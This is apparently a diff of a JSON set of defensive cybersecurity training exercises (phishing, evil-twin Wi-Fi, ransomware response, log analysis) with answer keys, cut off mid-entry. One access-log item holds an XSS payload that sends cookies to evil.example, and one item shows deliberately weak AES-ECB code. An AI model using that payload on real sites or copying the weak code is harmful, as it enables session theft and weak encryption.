@@ -1,1402 +1,1728 @@
 [
-  {
-    "id": "fond-anal",
-    "kind": "analysis",
-    "title": "Spot the spoofed sender",
-    "level": 2,
-    "artifactKind": "email",
-    "brief": "Here is the header of an email posing as a Microsoft security alert. One line gives the impersonation away.",
-    "lines": [
-      "From: Microsoft Security <no-reply@microsoft-securite-alerte.com>",
-      "To: jean.dupont@entreprise.fr",
-      "Subject: Your password expires today",
-      "Date: Mon, 20 Jul 2026 09:14",
-      "X-Mailer: Microsoft Outlook 16.0"
-    ],
-    "question": "Which line shows that the sender is impersonating Microsoft?",
-    "correctLine": 0,
-    "explanation": "The display name “Microsoft Security” is misleading: the actual domain is “microsoft-securite-alerte.com”, which does not belong to Microsoft. Legitimate messages come from domains such as microsoft.com or accountprotection.microsoft.com. It is the domain, not the display name, that really identifies the sender.",
-    "tags": [
-      "practice-v1"
+ {
+  "id": "fond-anal",
+  "kind": "analysis",
+  "title": "Spot the spoofed sender",
+  "level": 2,
+  "artifactKind": "email",
+  "brief": "You are starting on the IT help desk. A colleague forwards you a “Microsoft security alert” email that worries them: before they click, it is up to you to check the header. One line gives the impersonation away.",
+  "lines": [
+   "From: Microsoft Security <no-reply@microsoft-securite-alerte.com>",
+   "To: jean.dupont@entreprise.fr",
+   "Subject: Your password expires today",
+   "Date: Mon, 20 Jul 2026 09:14",
+   "X-Mailer: Microsoft Outlook 16.0"
+  ],
+  "question": "Which line shows that the sender is impersonating Microsoft?",
+  "correctLine": 0,
+  "explanation": "The display name “Microsoft Security” is misleading: the actual domain is “microsoft-securite-alerte.com”, which does not belong to Microsoft. Legitimate messages come from domains such as microsoft.com or accountprotection.microsoft.com. It is the domain, not the display name, that really identifies the sender.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "fond-scen",
+  "kind": "scenario",
+  "title": "The urgent email from your “bank”",
+  "level": 2,
+  "brief": "You are going through your personal inbox when an alarming message, supposedly sent by your bank, lands in it. At each step, choose the most cautious reaction.",
+  "start": "n1",
+  "nodes": {
+   "n1": {
+    "text": "Subject: “Account suspended — immediate verification required”. The email tells you to click a link within 24 hours or your account will be blocked. What do you do first?",
+    "choices": [
+     {
+      "text": "Click the link right away to avoid being blocked",
+      "to": "lose"
+     },
+     {
+      "text": "Take the time to examine the sender's address and hover over the link without clicking",
+      "to": "n2"
+     },
+     {
+      "text": "Reply to the email with your customer number to prove your identity",
+      "to": "lose"
+     }
     ]
+   },
+   "n2": {
+    "text": "The sender is “service-client@securite-banque-verif.ru” and the link points to an unknown domain, different from your bank's official website. What is the right decision?",
+    "choices": [
+     {
+      "text": "Open the link anyway, in a private browsing window, “just to check”",
+      "to": "lose"
+     },
+     {
+      "text": "Report the email as phishing, delete it, then contact the bank through its official website or phone number",
+      "to": "win"
+     }
+    ]
+   },
+   "win": {
+    "text": "Perfect. You gave away no information, you reported the attempt and you relied on the bank's official channels. That is exactly the right response to phishing.",
+    "outcome": "good"
+   },
+   "lose": {
+    "text": "Bad move: clicking, replying or entering your details exposes your credentials to scammers. An urgent email demanding immediate action is a classic phishing red flag.",
+    "outcome": "bad"
+   }
   },
-  {
-    "id": "fond-scen",
-    "kind": "scenario",
-    "title": "The urgent email from your “bank”",
-    "level": 2,
-    "brief": "You receive an alarming email claiming to be from your bank. At each step, choose the most cautious reaction.",
-    "start": "n1",
-    "nodes": {
-      "n1": {
-        "text": "Subject: “Account suspended — immediate verification required”. The email tells you to click a link within 24 hours or your account will be blocked. What do you do first?",
-        "choices": [
-          {
-            "text": "Click the link right away to avoid being blocked",
-            "to": "lose"
-          },
-          {
-            "text": "Take the time to examine the sender's address and hover over the link without clicking",
-            "to": "n2"
-          },
-          {
-            "text": "Reply to the email with your customer number to prove your identity",
-            "to": "lose"
-          }
-        ]
-      },
-      "n2": {
-        "text": "The sender is “service-client@securite-banque-verif.ru” and the link points to an unknown domain, different from your bank's official website. What is the right decision?",
-        "choices": [
-          {
-            "text": "Open the link anyway, in a private browsing window, “just to check”",
-            "to": "lose"
-          },
-          {
-            "text": "Report the email as phishing, delete it, then contact the bank through its official website or phone number",
-            "to": "win"
-          }
-        ]
-      },
-      "win": {
-        "text": "Perfect. You gave away no information, you reported the attempt and you relied on the bank's official channels. That is exactly the right response to phishing.",
-        "outcome": "good"
-      },
-      "lose": {
-        "text": "Bad move: clicking, replying or entering your details exposes your credentials to scammers. An urgent email demanding immediate action is a classic phishing red flag.",
-        "outcome": "bad"
-      }
-    },
-    "tags": [
-      "practice-v1"
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "fond-order",
+  "kind": "order",
+  "title": "Responding to a compromised account",
+  "level": 3,
+  "brief": "Too late: one of your online accounts has been hacked, and unknown logins are showing up on it. You have to regain control without making things worse — put the response steps back in the right order.",
+  "prompt": "Order the actions to regain control of the account and limit the damage.",
+  "items": [
+   {
+    "id": "d",
+    "text": "Check the account settings: forwarding rules and recovery address"
+   },
+   {
+    "id": "a",
+    "text": "Change the account password from a clean device"
+   },
+   {
+    "id": "e",
+    "text": "Warn your contacts and report the compromised account to the provider"
+   },
+   {
+    "id": "b",
+    "text": "Close / revoke every other active session"
+   },
+   {
+    "id": "c",
+    "text": "Turn on two-factor authentication (MFA)"
+   }
+  ],
+  "correctOrder": [
+   "a",
+   "b",
+   "c",
+   "d",
+   "e"
+  ],
+  "explanation": "You first regain control by changing the password from a trusted device (a), then you kill the attacker's still-open sessions (b). Next you add two-factor authentication to lock access down (c). You then make sure the attacker left no backdoor behind — an altered forwarding rule or recovery address (d). Finally, you warn your contacts and the provider to contain the damage (e).",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "fond-term",
+  "kind": "terminal",
+  "title": "Keeping your system up to date",
+  "level": 4,
+  "brief": "The last step in securing your machine: keeping it up to date to close known vulnerabilities. On this Linux box (Debian/Ubuntu), run a basic update, one command at a time.",
+  "shell": "user@pc:~$",
+  "steps": [
+   {
+    "instruction": "Fetch the latest list of packages and their versions from the repositories.",
+    "expect": "sudo\\s+apt\\s+update",
+    "output": "Hit:1 http://deb.debian.org/debian bookworm InRelease\nReading package lists... Done\n12 packages can be upgraded. Run 'apt list --upgradable' to see them.",
+    "hint": "sudo apt update",
+    "tokens": [
+     "sudo",
+     "apt",
+     "update"
+    ],
+    "distractors": [
+     "install",
+     "-rf",
+     "curl",
+     "systemctl"
     ]
+   },
+   {
+    "instruction": "Show the list of packages that can be upgraded.",
+    "expect": "apt\\s+list\\s+--upgradable",
+    "output": "Listing... Done\nlibssl3/stable 3.0.14-1 amd64 [upgradable from: 3.0.13-1]\nopenssh-client/stable 1:9.2p1-2 amd64 [upgradable from: 1:9.2p1-1]",
+    "hint": "apt list --upgradable",
+    "tokens": [
+     "apt",
+     "list",
+     "--upgradable"
+    ],
+    "distractors": [
+     "search",
+     "show",
+     "remove",
+     "-a"
+    ]
+   },
+   {
+    "instruction": "Apply the available upgrades.",
+    "expect": "sudo\\s+apt\\s+(full-)?upgrade",
+    "output": "Reading package lists... Done\nThe following packages will be upgraded: libssl3 openssh-client\n2 upgraded, 0 newly installed.\nSetting up libssl3 (3.0.14-1)...\nSetting up openssh-client (1:9.2p1-2)...",
+    "hint": "sudo apt upgrade",
+    "tokens": [
+     "sudo",
+     "apt",
+     "upgrade"
+    ],
+    "distractors": [
+     "update",
+     "autoremove",
+     "-y",
+     "remove"
+    ]
+   }
+  ],
+  "success": "Nicely done: your system is up to date. Installing updates regularly closes known vulnerabilities — an essential piece of everyday security hygiene.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "net-scen",
+  "kind": "scenario",
+  "title": "Public Wi-Fi: the evil twin trap",
+  "level": 4,
+  "brief": "You are waiting in a café and want to check your bank account from your phone. Two Wi-Fi networks have almost the same name, and one of them is a trap. Make the right calls.",
+  "start": "n1",
+  "nodes": {
+   "n1": {
+    "text": "Two networks show up: “CafeCentral_WiFi” (WPA2, padlock) and “CafeCentral_Free” (open, no password). You want to reach your bank. What do you do?",
+    "choices": [
+     {
+      "text": "I ask the staff for the exact name and password of the official network",
+      "to": "n2"
+     },
+     {
+      "text": "I join “CafeCentral_Free” — it's easier and it's free",
+      "to": "bad1"
+     },
+     {
+      "text": "I join the open one, but I turn my VPN on first",
+      "to": "n3"
+     }
+    ]
+   },
+   "n2": {
+    "text": "The staff confirm it: the real network is “CafeCentral_WiFi” (WPA2). There is no official “Free” network — it is almost certainly an evil twin set up by an attacker. You join the right network. Now, what about your bank?",
+    "choices": [
+     {
+      "text": "I check my bank's exact URL and the HTTPS padlock (or I use the app over 4G/5G)",
+      "to": "good1"
+     },
+     {
+      "text": "I type in my credentials: WPA2 already encrypts everything, so there's no risk",
+      "to": "bad2"
+     }
+    ]
+   },
+   "n3": {
+    "text": "Turning on a VPN is a good reflex: the tunnel encrypts your traffic even on a hostile network. But associating with an unknown access point (“Free” = possible evil twin) exposes you before the tunnel is up: forged captive portal, DNS redirection, on-path interception (MITM). What do you do?",
+    "choices": [
+     {
+      "text": "I switch to the official WPA2 network confirmed by the staff, VPN still on",
+      "to": "good1"
+     },
+     {
+      "text": "I stay on the open one: my VPN makes me invulnerable to everything",
+      "to": "bad3"
+     }
+    ]
+   },
+   "good1": {
+    "text": "Perfect. You associated with the legitimate network (verified with the café), you check the URL and end-to-end HTTPS, and you can layer a VPN on top. An evil twin can no longer intercept your session. If you are still unsure, 4G/5G remains the safest option.",
+    "outcome": "good"
+   },
+   "bad1": {
+    "text": "“CafeCentral_Free” is an evil twin: an attacker cloned the café's name on an open access point. All your unencrypted traffic flows through them — credential capture, DNS spoofing, booby-trapped captive portal. Never join an unverified open Wi-Fi network for anything sensitive.",
+    "outcome": "bad"
+   },
+   "bad2": {
+    "text": "Dangerous shortcut. Link-layer encryption (WPA2) protects the radio hop, but it says nothing about the destination: without checking the URL and the HTTPS certificate, a poisoned DNS or a rogue captive portal can send you to a fake banking page. The real defense is end-to-end HTTPS, not just Wi-Fi encryption.",
+    "outcome": "bad"
+   },
+   "bad3": {
+    "text": "Faulty reasoning. A VPN does protect what travels inside the tunnel, but staying associated with an evil twin exposes you before the tunnel is even established (captive portal, DNS) and leaves the attacker in control of the network. The real defense combines a verified network + end-to-end HTTPS + healthy distrust of open SSIDs.",
+    "outcome": "bad"
+   }
   },
-  {
-    "id": "fond-order",
-    "kind": "order",
-    "title": "Responding to a compromised account",
-    "level": 3,
-    "brief": "One of your online accounts has been hacked: unknown logins are showing up. Put the response steps back in the right order.",
-    "prompt": "Order the actions to regain control of the account and limit the damage.",
-    "items": [
-      {
-        "id": "d",
-        "text": "Check the account settings: forwarding rules and recovery address"
-      },
-      {
-        "id": "a",
-        "text": "Change the account password from a clean device"
-      },
-      {
-        "id": "e",
-        "text": "Warn your contacts and report the compromised account to the provider"
-      },
-      {
-        "id": "b",
-        "text": "Close / revoke every other active session"
-      },
-      {
-        "id": "c",
-        "text": "Turn on two-factor authentication (MFA)"
-      }
-    ],
-    "correctOrder": [
-      "a",
-      "b",
-      "c",
-      "d",
-      "e"
-    ],
-    "explanation": "You first regain control by changing the password from a trusted device (a), then you kill the attacker's still-open sessions (b). Next you add two-factor authentication to lock access down (c). You then make sure the attacker left no backdoor behind — an altered forwarding rule or recovery address (d). Finally, you warn your contacts and the provider to contain the damage (e).",
-    "tags": [
-      "practice-v1"
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "crypto-scen",
+  "kind": "scenario",
+  "title": "How should you store passwords?",
+  "level": 6,
+  "brief": "You are handed the authentication for an application. The way you store passwords will decide everything the day the database leaks. Make the right calls.",
+  "start": "n1",
+  "nodes": {
+   "n1": {
+    "text": "How do you store user passwords in the database?",
+    "choices": [
+     {
+      "text": "In plaintext, so I can send them back if a user forgets",
+      "to": "bad1"
+     },
+     {
+      "text": "Hashed with MD5: it is fast and already built in",
+      "to": "n2"
+     },
+     {
+      "text": "Hashed with bcrypt (or Argon2)",
+      "to": "n3"
+     }
     ]
+   },
+   "n2": {
+    "text": "MD5 is a very fast general-purpose hash, and it is broken for this use: ready-made rainbow tables and billions of guesses per second on a GPU. How do you fix it?",
+    "choices": [
+     {
+      "text": "I add a unique salt per user; salted MD5 will do",
+      "to": "n2b"
+     },
+     {
+      "text": "I replace MD5 with bcrypt or Argon2",
+      "to": "n3"
+     }
+    ]
+   },
+   "n2b": {
+    "text": "The salt does defeat rainbow tables, but MD5 is still far too fast: an attacker can keep testing billions of candidates per second. You need a slow, tunable hash. What do you do?",
+    "choices": [
+     {
+      "text": "I switch to bcrypt / Argon2 (slow hashing, salt handled by the library)",
+      "to": "n3"
+     },
+     {
+      "text": "I keep salted MD5, it will be fine",
+      "to": "bad2"
+     }
+    ]
+   },
+   "n3": {
+    "text": "Good call: bcrypt and Argon2 are slow derivation functions that generate a random salt automatically. One last setting?",
+    "choices": [
+     {
+      "text": "I set a sensible cost factor (e.g. bcrypt cost 12) and let the library generate a random salt for each password",
+      "to": "good1"
+     },
+     {
+      "text": "I use a single hard-coded global salt for every user",
+      "to": "bad3"
+     }
+    ]
+   },
+   "good1": {
+    "text": "Perfect. bcrypt/Argon2 with a suitable cost and a unique random salt per user: two accounts with the same password produce different hashes, and cracking a single hash is extremely expensive. This is the state of the art for storing passwords. Remember: you never \"recover\" a password, you offer a reset.",
+    "outcome": "good"
+   },
+   "bad1": {
+    "text": "Storing passwords in plaintext is a serious mistake: the slightest database leak exposes every account, all the more so because people reuse their passwords elsewhere. A service must never be able to read a password: you hash it, and you offer a reset rather than sending it back.",
+    "outcome": "bad"
+   },
+   "bad2": {
+    "text": "MD5, even salted, is still crackable by massive brute force: its speed works against you. Passwords need a slow, purpose-built KDF (bcrypt, scrypt, Argon2), not a fast general-purpose hash.",
+    "outcome": "bad"
+   },
+   "bad3": {
+    "text": "A hard-coded global salt cancels out much of the benefit: two users with the same password end up with the same hash, and once the salt leaks, attacks can be pre-computed. The salt must be random and unique per user, which is exactly what bcrypt/Argon2 already do for you.",
+    "outcome": "bad"
+   }
   },
-  {
-    "id": "fond-term",
-    "kind": "terminal",
-    "title": "Keeping your system up to date",
-    "level": 4,
-    "brief": "Updating your software fixes known vulnerabilities. On this Linux machine (Debian/Ubuntu), run a basic update. Type the commands one at a time.",
-    "shell": "user@pc:~$",
-    "steps": [
-      {
-        "instruction": "Fetch the latest list of packages and their versions from the repositories.",
-        "expect": "sudo\\s+apt\\s+update",
-        "output": "Hit:1 http://deb.debian.org/debian bookworm InRelease\nReading package lists... Done\n12 packages can be upgraded. Run 'apt list --upgradable' to see them.",
-        "hint": "sudo apt update"
-      },
-      {
-        "instruction": "Show the list of packages that can be upgraded.",
-        "expect": "apt\\s+list\\s+--upgradable",
-        "output": "Listing... Done\nlibssl3/stable 3.0.14-1 amd64 [upgradable from: 3.0.13-1]\nopenssh-client/stable 1:9.2p1-2 amd64 [upgradable from: 1:9.2p1-1]",
-        "hint": "apt list --upgradable"
-      },
-      {
-        "instruction": "Apply the available upgrades.",
-        "expect": "sudo\\s+apt\\s+(full-)?upgrade",
-        "output": "Reading package lists... Done\nThe following packages will be upgraded: libssl3 openssh-client\n2 upgraded, 0 newly installed.\nSetting up libssl3 (3.0.14-1)...\nSetting up openssh-client (1:9.2p1-2)...",
-        "hint": "sudo apt upgrade"
-      }
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "net-anal",
+  "kind": "analysis",
+  "title": "Spot the suspicious connection in ss",
+  "level": 6,
+  "artifactKind": "log",
+  "brief": "You are investigating a Linux machine that came back from a trip and has been behaving strangely. Here is an excerpt from `ss -tnp` (established TCP connections): only one of them gives away a compromise. Which one?",
+  "lines": [
+   "State   Local Address:Port      Peer Address:Port        Process",
+   "ESTAB   192.168.1.20:44312      140.82.121.4:443         users:((\"firefox\",pid=2201))",
+   "ESTAB   192.168.1.20:22         192.168.1.10:53987       users:((\"sshd\",pid=1450))",
+   "ESTAB   192.168.1.20:59104      185.220.101.47:4444      users:((\"bash\",pid=3390))",
+   "ESTAB   192.168.1.20:443        192.168.1.35:61120       users:((\"nginx\",pid=980))",
+   "ESTAB   192.168.1.20:51022      142.250.178.100:443      users:((\"thunderbird\",pid=2560))"
+  ],
+  "question": "Which connection corresponds to a reverse shell (command-and-control channel)?",
+  "correctLine": 3,
+  "explanation": "`bash` has no reason to open an outbound connection to the Internet. Here it establishes a session to 185.220.101.47:4444: port 4444 is Metasploit's default and the IP belongs to a well-known range of Tor exit nodes — this is a reverse shell. The other lines are legitimate: outbound HTTPS (443) from firefox and thunderbird, inbound SSH (22) from the LAN, and 443 served by nginx to a machine on the local network.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "net-term",
+  "kind": "terminal",
+  "title": "Troubleshooting an unreachable service",
+  "level": 6,
+  "brief": "A colleague reports that the intranet is “crawling”. It is up to you to work through the network chain with read-only commands: DNS resolution, established connections, then the path to the server.",
+  "shell": "user@pc:~$",
+  "steps": [
+   {
+    "instruction": "Start with name resolution: query the A record for `intranet.exemple.lan` to see which IP it points to.",
+    "expect": "^(dig|nslookup)\\b",
+    "hint": "dig intranet.exemple.lan A",
+    "output": "; <<>> DiG 9.18.24 <<>> intranet.exemple.lan A\n;; ANSWER SECTION:\nintranet.exemple.lan.  300  IN  A  10.20.30.40\n\n;; Query time: 3 msec\n;; SERVER: 10.20.0.1#53(10.20.0.1) (UDP)",
+    "tokens": [
+     "dig",
+     "intranet.exemple.lan",
+     "A"
     ],
-    "success": "Nicely done: your system is up to date. Installing updates regularly closes known vulnerabilities — an essential piece of everyday security hygiene.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "ping",
+     "host",
+     "-x",
+     "MX"
     ]
+   },
+   {
+    "instruction": "The name resolves to 10.20.30.40, so DNS is healthy. Now display the TCP/UDP sockets (listening and established) together with the process that owns them.",
+    "expect": "^(ss|netstat)\\b",
+    "hint": "ss -tunap",
+    "output": "Netid State   Recv-Q Send-Q  Local Address:Port    Peer Address:Port     Process\ntcp   ESTAB   0      0       10.20.30.15:52410     10.20.30.40:443       users:((\"firefox\",pid=3120))\ntcp   LISTEN  0      128     0.0.0.0:22            0.0.0.0:*             users:((\"sshd\",pid=760))\nudp   UNCONN  0      0       10.20.30.15:68        0.0.0.0:*             users:((\"dhclient\",pid=612))",
+    "tokens": [
+     "ss",
+     "-tunap"
+    ],
+    "distractors": [
+     "lsof",
+     "ip",
+     "-r",
+     "tcpdump"
+    ]
+   },
+   {
+    "instruction": "The HTTPS session (443) to 10.20.30.40 is properly established. Trace the network path to the server to pinpoint any slow hop.",
+    "expect": "^(traceroute|tracepath|mtr)\\b",
+    "hint": "traceroute 10.20.30.40",
+    "output": "traceroute to 10.20.30.40 (10.20.30.40), 30 hops max, 60 byte packets\n 1  10.20.30.1 (10.20.30.1)  0.512 ms  0.480 ms  0.455 ms\n 2  10.20.0.1 (10.20.0.1)  1.204 ms  1.180 ms  1.150 ms\n 3  10.20.30.40 (10.20.30.40)  1.502 ms  1.470 ms  1.440 ms",
+    "tokens": [
+     "traceroute",
+     "10.20.30.40"
+    ],
+    "distractors": [
+     "ping",
+     "route",
+     "nmap",
+     "-n"
+    ]
+   }
+  ],
+  "success": "Diagnosis complete: DNS resolves `intranet.exemple.lan` → 10.20.30.40 (answer from the resolver on port 53), an HTTPS session (443) is properly established, and traceroute confirms a short, healthy path (3 hops, < 2 ms). On the network side everything is nominal — the slowness is most likely in the application (server or browser), not the network.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "threats-anal",
+  "kind": "analysis",
+  "title": "Spot the IOC in the DNS log",
+  "level": 6,
+  "artifactKind": "log",
+  "brief": "As a threat analyst, you are examining a workstation's DNS query log. Malware installed on the machine is trying to reach its command & control (C2) server through an algorithmically generated domain (DGA): spot the indicator of compromise (IOC).",
+  "lines": [
+   "10:14:02  DNS A?  outlook.office365.com          -> NOERROR",
+   "10:14:05  DNS A?  clients4.google.com           -> NOERROR",
+   "10:14:09  DNS A?  ctldl.windowsupdate.com       -> NOERROR",
+   "10:14:11  DNS A?  hj29fkq7zx4bvn1m.top          -> NXDOMAIN",
+   "10:14:14  DNS A?  safebrowsing.googleapis.com   -> NOERROR",
+   "10:14:18  DNS A?  fonts.gstatic.com             -> NOERROR"
+  ],
+  "question": "Which line gives away a request to a DGA-generated C2 domain?",
+  "correctLine": 3,
+  "explanation": "The domain `hj29fkq7zx4bvn1m.top` looks nothing like a readable name: a high-entropy string of characters, typical of a Domain Generation Algorithm (DGA). The malware tries pseudo-random names until it hits the one the attacker has registered; the failures come back as `NXDOMAIN`. Combined with a steady request rhythm (beaconing), this is a classic IOC of a C2 channel. Countermeasures: detection based on domain entropy, DNS blocking and network segmentation.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "threats-scen",
+  "kind": "scenario",
+  "title": "Ransomware detected on a workstation",
+  "level": 7,
+  "brief": "A user calls you in a panic: a ransom note is showing and their files now carry the `.locked` extension. Ransomware has encrypted the machine and every second counts — make the right calls.",
+  "start": "n1",
+  "nodes": {
+   "n1": {
+    "text": "The note demands a cryptocurrency payment to “decrypt” the files. The machine is still powered on and connected to the company network. What is your very first action?",
+    "choices": [
+     {
+      "text": "I isolate the machine: I unplug the network cable and turn off Wi-Fi",
+      "to": "n2"
+     },
+     {
+      "text": "I pay the ransom right away to get the files back",
+      "to": "bad_pay"
+     },
+     {
+      "text": "I let the user carry on working and hope it stops",
+      "to": "bad_ignore"
+     }
+    ]
+   },
+   "n2": {
+    "text": "Well played: cutting off the network stops the ransomware from spreading to the shares and to other machines. The machine stays powered on (useful for analysis). What do you do next?",
+    "choices": [
+     {
+      "text": "I escalate the incident to the security team (SOC / CSIRT) immediately",
+      "to": "n3"
+     },
+     {
+      "text": "I delete the ransom note and hand the machine back to the user",
+      "to": "bad_ignore"
+     }
+    ]
+   },
+   "n3": {
+    "text": "The security team takes over and confirms the encryption. The files on the machine are still inaccessible. How do you restore the data?",
+    "choices": [
+     {
+      "text": "We restore from a clean, earlier offline backup",
+      "to": "good1"
+     },
+     {
+      "text": "We pay the ransom, it's faster than restoring",
+      "to": "bad_pay"
+     }
+    ]
+   },
+   "good1": {
+    "text": "Exactly. The countermeasure against ransomware is not payment but the offline backup: you isolate, you escalate the incident, then you rebuild the machine and restore the data from a clean copy the malware could not reach. Payment is never guaranteed and it funds the attackers.",
+    "outcome": "good"
+   },
+   "bad_pay": {
+    "text": "Paying is the wrong call: nothing guarantees you will get the key, it funds and encourages the attackers, marks you out as a paying target, and does nothing to remove their presence from the network. The right answer is to isolate the machine, alert security, then restore from an offline backup.",
+    "outcome": "bad"
+   },
+   "bad_ignore": {
+    "text": "Doing nothing (or merely hiding the note) is dangerous: as long as the machine is connected, encryption can carry on and reach the network shares and other machines. You had to isolate the machine from the network first, then alert the security team.",
+    "outcome": "bad"
+   }
   },
-  {
-    "id": "net-scen",
-    "kind": "scenario",
-    "title": "Public Wi-Fi: the evil twin trap",
-    "level": 4,
-    "brief": "You are in a café and want to check your bank account from your phone. Two Wi-Fi networks have almost the same name. Make the right calls.",
-    "start": "n1",
-    "nodes": {
-      "n1": {
-        "text": "Two networks show up: “CafeCentral_WiFi” (WPA2, padlock) and “CafeCentral_Free” (open, no password). You want to reach your bank. What do you do?",
-        "choices": [
-          {
-            "text": "I ask the staff for the exact name and password of the official network",
-            "to": "n2"
-          },
-          {
-            "text": "I join “CafeCentral_Free” — it's easier and it's free",
-            "to": "bad1"
-          },
-          {
-            "text": "I join the open one, but I turn my VPN on first",
-            "to": "n3"
-          }
-        ]
-      },
-      "n2": {
-        "text": "The staff confirm it: the real network is “CafeCentral_WiFi” (WPA2). There is no official “Free” network — it is almost certainly an evil twin set up by an attacker. You join the right network. Now, what about your bank?",
-        "choices": [
-          {
-            "text": "I check my bank's exact URL and the HTTPS padlock (or I use the app over 4G/5G)",
-            "to": "good1"
-          },
-          {
-            "text": "I type in my credentials: WPA2 already encrypts everything, so there's no risk",
-            "to": "bad2"
-          }
-        ]
-      },
-      "n3": {
-        "text": "Turning on a VPN is a good reflex: the tunnel encrypts your traffic even on a hostile network. But associating with an unknown access point (“Free” = possible evil twin) exposes you before the tunnel is up: forged captive portal, DNS redirection, on-path interception (MITM). What do you do?",
-        "choices": [
-          {
-            "text": "I switch to the official WPA2 network confirmed by the staff, VPN still on",
-            "to": "good1"
-          },
-          {
-            "text": "I stay on the open one: my VPN makes me invulnerable to everything",
-            "to": "bad3"
-          }
-        ]
-      },
-      "good1": {
-        "text": "Perfect. You associated with the legitimate network (verified with the café), you check the URL and end-to-end HTTPS, and you can layer a VPN on top. An evil twin can no longer intercept your session. If you are still unsure, 4G/5G remains the safest option.",
-        "outcome": "good"
-      },
-      "bad1": {
-        "text": "“CafeCentral_Free” is an evil twin: an attacker cloned the café's name on an open access point. All your unencrypted traffic flows through them — credential capture, DNS spoofing, booby-trapped captive portal. Never join an unverified open Wi-Fi network for anything sensitive.",
-        "outcome": "bad"
-      },
-      "bad2": {
-        "text": "Dangerous shortcut. Link-layer encryption (WPA2) protects the radio hop, but it says nothing about the destination: without checking the URL and the HTTPS certificate, a poisoned DNS or a rogue captive portal can send you to a fake banking page. The real defense is end-to-end HTTPS, not just Wi-Fi encryption.",
-        "outcome": "bad"
-      },
-      "bad3": {
-        "text": "Faulty reasoning. A VPN does protect what travels inside the tunnel, but staying associated with an evil twin exposes you before the tunnel is even established (captive portal, DNS) and leaves the attacker in control of the network. The real defense combines a verified network + end-to-end HTTPS + healthy distrust of open SSIDs.",
-        "outcome": "bad"
-      }
-    },
-    "tags": [
-      "practice-v1"
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "web-anal",
+  "kind": "analysis",
+  "title": "Spot the attack in the access log",
+  "level": 7,
+  "artifactKind": "log",
+  "brief": "You are watching over a web server and combing through its access log. Only one of these requests is an attack attempt; the parameter values are URL-encoded, so decode them in your head.",
+  "lines": [
+   "203.0.113.7 - - \"GET /home HTTP/1.1\" 200",
+   "203.0.113.7 - - \"GET /products?cat=books HTTP/1.1\" 200",
+   "198.51.100.9 - - \"GET /search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.example%2Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\" 200",
+   "203.0.113.7 - - \"GET /products/42 HTTP/1.1\" 200",
+   "198.51.100.9 - - \"GET /contact HTTP/1.1\" 200"
+  ],
+  "question": "Which line is a reflected Cross-Site Scripting (XSS) attempt?",
+  "correctLine": 2,
+  "explanation": "Once decoded, the `q` parameter reads `<script>document.location='http://evil.example/c='+document.cookie</script>`. If the application echoes that value back without escaping it, the victim's browser runs the JavaScript and ships their session cookie off to evil.example. That is the essence of XSS: the code executes on the victim's side, not on the server. Defenses: encode/escape every HTML output and set a Content-Security-Policy that restricts which scripts are allowed.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "crypto-anal",
+  "kind": "analysis",
+  "title": "The flaw in the encryption code",
+  "level": 8,
+  "artifactKind": "code",
+  "brief": "During a code review, you come across a Python function meant to encrypt data with AES. The key is handled properly, but a single line introduces a major cryptographic weakness. Can you spot it?",
+  "lines": [
+   "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes",
+   "import os",
+   "key = bytes.fromhex(os.environ[\"AES_KEY\"])  # 256-bit key provided by the KMS",
+   "def encrypt(block: bytes) -> bytes:",
+   "    cipher = Cipher(algorithms.AES(key), modes.ECB())",
+   "    enc = cipher.encryptor()",
+   "    return enc.update(pad(block, 16)) + enc.finalize()"
+  ],
+  "question": "Which line introduces a major cryptographic weakness?",
+  "correctLine": 4,
+  "explanation": "ECB mode encrypts each block independently: two identical plaintext blocks give two identical ciphertext blocks. The patterns of the message therefore leak into the ciphertext (in the famous \"ECB penguin\" example the image stays perfectly recognizable). You need a mode that breaks that regularity: ideally AES-GCM (authenticated encryption, with a unique nonce for every message), or at the very least CBC with a random IV. The key itself is correctly loaded from the environment; that is not the problem here.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "net-order",
+  "kind": "order",
+  "title": "Put DNS resolution in order",
+  "level": 8,
+  "brief": "You are explaining to an intern what happens when you type a URL: before the connection can even open, the domain name has to become an IP address. Put the steps of a recursive DNS lookup back in the right order.",
+  "prompt": "Tap the steps in the correct chronological order.",
+  "items": [
+   {
+    "id": "tld",
+    "text": "The resolver queries the TLD server (.com), which returns the domain's authoritative name servers"
+   },
+   {
+    "id": "auth",
+    "text": "The resolver queries the authoritative server, which returns the A record (the IP address)"
+   },
+   {
+    "id": "cache-local",
+    "text": "The client checks its local DNS cache (and /etc/hosts); no match, so it queries the resolver"
+   },
+   {
+    "id": "root",
+    "text": "The resolver queries a root server, which returns the addresses of the TLD servers"
+   },
+   {
+    "id": "resolver",
+    "text": "The query reaches the recursive resolver (e.g. 8.8.8.8), which has no cached answer"
+   },
+   {
+    "id": "return",
+    "text": "The resolver caches the answer (for the duration of the TTL) and returns the IP to the client, which opens the connection"
+   }
+  ],
+  "correctOrder": [
+   "cache-local",
+   "resolver",
+   "root",
+   "tld",
+   "auth",
+   "return"
+  ],
+  "explanation": "Recursive DNS resolution: the client checks its local cache first, then hands the query off to the recursive resolver. With nothing cached, the resolver walks down the hierarchy — root → TLD (.com) → authoritative server — which supplies the A record. The resolver caches it for the TTL, then returns the IP. DNS listens on port 53 (UDP, falling back to TCP for large responses).",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "sys-anal",
+  "kind": "analysis",
+  "title": "One permission too many",
+  "level": 8,
+  "artifactKind": "code",
+  "brief": "You are reviewing a provisioning script that sets up database backups on a Linux server. One line introduces a file permissions misconfiguration — catch it before it ships to production.",
